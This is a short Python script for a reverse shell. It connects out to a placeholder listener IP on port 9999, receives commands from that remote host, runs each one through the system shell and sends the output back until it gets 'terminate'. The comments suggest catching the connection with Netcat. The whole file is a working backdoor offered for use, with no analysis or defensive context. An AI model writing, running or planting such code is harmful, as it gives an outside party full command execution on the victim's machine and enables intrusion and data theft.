import socket    
import subprocess 

def connect():
    #Creat a scoket and connect to HOST. You can alos setup Netcat to capture this shell.
    # The 9999 is the port you want to connect to
    s = socket.socket()
    s.connect(('Put IP address of Listening device', 9999)) 

    while True:
        command = s.recv(1024) 

        if 'terminate' in command.decode():
            s.close()
            break
        else:   

            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read()) 
            s.send(CMD.stderr.read()) 

def main():
    connect()
main()
